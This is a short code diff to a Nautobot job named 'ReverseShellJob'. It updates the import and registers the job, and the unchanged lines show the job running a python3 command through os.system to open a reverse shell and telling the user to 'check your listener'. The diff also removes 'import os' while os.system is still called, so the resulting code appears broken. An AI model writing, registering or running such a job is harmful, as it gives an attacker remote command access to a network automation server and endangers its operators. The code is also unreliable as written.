@@ -1,6 +1,5 @@
-import os  
-from nautobot.extras.jobs import Job  
- 
+from nautobot.apps.jobs import Job, register_jobs
+
 class ReverseShellJob(Job):  
     class Meta:  
         name = "Reverse Shell Job"  
@@ -28,3 +27,5 @@ class ReverseShellJob(Job):
         os.system(f"python3 -c '{command}'")  
  
         self.log_success("Reverse shell command executed. Check your listener.")  
+
+register_jobs(ReverseShellJob)
